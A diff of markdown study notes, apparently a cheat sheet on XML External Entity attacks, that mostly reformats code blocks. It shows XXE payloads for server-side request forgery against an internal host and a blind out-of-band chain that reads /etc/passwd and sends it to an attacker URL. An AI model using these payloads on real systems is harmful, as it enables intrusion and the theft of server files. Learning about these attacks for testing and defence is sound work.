@@ -21,15 +21,17 @@ XXE is a web security vulnerability that allows an attacker to interfere with an
 <product>&xxe;</product>
 <adress>&xxe;</adress>
 ```
-	- Defining a new Entity called ```xxe```. This entity is made to execute a system call.
+- Defining a new Entity called ```xxe```. This entity is made to execute a system call.
 - XXE for Server-Side Request Forgery 
-	- ```xml 
-	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internals.target.com"> ]>```
+```xml 
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internals.target.com"> ]>
+```
 	- System call to an HTTP endpoint of an internal webserver of which we should not see the contents from outside.
 - Data out-of-band exfiltration (Blind XXE)
-- ```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://Attacker.com"> ]>```
-- Make a callback to our server.
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://Attacker.com"> ]>
+```
+	- Make a callback to our server.
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % evil "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
